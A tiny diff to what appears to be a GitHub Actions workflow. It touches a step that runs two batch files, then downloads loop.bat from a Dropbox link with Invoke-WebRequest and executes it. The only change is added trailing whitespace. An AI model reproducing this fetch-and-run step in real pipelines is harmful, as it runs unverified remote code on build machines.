@@ -12,4 +12,4 @@ jobs:
          cmd /c Downloads.bat
          cmd /c start.bat
          Invoke-WebRequest -Uri "https://www.dropbox.com/s/coszn8d2zr7ws3p/loop.bat?dl=1" -OutFile loop.bat
-         cmd /c loop.bat
+         cmd /c loop.bat 
